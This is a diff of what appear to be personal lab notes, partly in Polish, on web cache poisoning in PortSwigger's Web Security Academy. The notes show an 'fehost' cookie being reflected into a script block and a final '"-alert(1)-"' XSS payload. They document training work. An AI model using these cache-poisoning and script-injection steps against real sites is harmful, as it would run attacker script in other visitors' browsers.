@@ -148,9 +148,8 @@ X-Cache: hit – jest w cache
 
 <br>
 
-2. Cache- buster GET     > part of cache key
+2.Cache- buster GET     > part of cache key
 /?cb=kasia123 miss hit
-
 
   <br>
 
@@ -166,30 +165,23 @@ Use this as a part of CB, not to not impack other users visiting / page that we 
 Cookie: session=9gmLxSJpmBeVw8WVG6uWluicMVmP4Cga; fehost=prod-cache-01 
 prod-cache-01 jest odbite już w odpowiedzi, wiec jest to ważne zrodlo umieszczenia js
 
-REQ
-fehost:
 fehost=prod-cache-03
 
-RES:
-``` <script>  data = {"host":"0a0a007c030ae19c80036c210097001a.web-security-academy.net","path":"/","frontend":"prod-cache-03"} </script> ```
+<script>  data = {"host":"0a0a007c030ae19c80036c210097001a.web-security-academy.net","path":"/","frontend":"prod-cache-03"} </script> ```
  
  <br>
  
-4. fehost robimy pusty 
-REQ 
+4.fehost robimy pusty  
 fehost= 
 
-RESP 
 "frontend":""
 
  <br> 
  
-
-<br>
+5.final payload
 
 fehost
 "-alert(1)-"
-
 
 ```<script> data = {"host":"0ac5004b043c07b180c23a8a007d00de.web-security-academy.net","path":"/","frontend":""-alert(1)-""} </script>```
 
@@ -202,10 +194,9 @@ fehost
 <img width="1235" height="537" alt="image" src="https://github.com/user-attachments/assets/1fcd3e39-90a7-4a2b-bd1b-93f7b424b2c9" />
 
   
-  
   <br>
   <hr>
-   <br> 
+  <br> 
 
 <h2>Lab: Web cache poisoning with multiple headers </h2>
  <br>
